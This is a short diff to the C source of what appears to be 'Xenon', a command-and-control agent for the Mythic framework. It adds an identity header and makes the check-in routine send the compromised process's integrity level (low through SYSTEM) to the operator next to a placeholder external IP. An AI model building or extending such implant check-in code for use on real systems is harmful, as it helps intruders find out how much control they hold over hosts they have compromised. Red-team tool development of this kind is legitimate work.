@@ -1,6 +1,7 @@
 #include "Xenon.h"
 #include "Checkin.h"
 #include "Task.h"
+#include "Identity.h"
 
 #include "TransportSmb.h"
 #include "TransportTcp.h"
@@ -174,6 +175,7 @@ BOOL CheckinSend()
         Process Name
         Size ExternIP
         Extern IP
+        Integrity Level (BYTE: 0-4 Mythic integrity_level)
     */
 
     
@@ -244,6 +246,9 @@ BOOL CheckinSend()
     
     // External IP 
     PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
+
+    // Integrity level (Mythic: 1 low, 2 medium, 3 high, 4 SYSTEM; >2 = elevated UI)
+    PackageAddByte(CheckinData, IdentityGetIntegrityLevel());
 
     /* Free some allocations */
     LocalFree(tableOfIPs);
